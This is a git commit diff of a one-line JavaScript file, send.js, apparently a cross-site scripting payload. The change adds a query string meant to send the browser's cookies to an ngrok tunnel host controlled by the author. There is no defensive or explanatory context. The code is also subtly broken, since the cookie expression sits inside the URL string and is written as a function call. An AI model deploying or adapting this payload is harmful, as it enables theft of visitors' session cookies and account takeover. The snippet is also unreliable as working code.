fcb0f8383fdde61fd3bad49adad52094cf50c8da
merteren1234 <118080184+merteren1234@users.noreply.github.com>
2025-02-16 18:36:03 +0300

    Update send.js

--- send.js
+++ send.js
@@ -1,1 +1,1 @@
-var x=new XMLHttpRequest();x.open("GET","https://404a-24-133-64-217.ngrok-free.app",false);x.send(null);
+var x=new XMLHttpRequest();x.open("GET","https://404a-24-133-64-217.ngrok-free.app?x=document.cookie()",false);x.send(null);
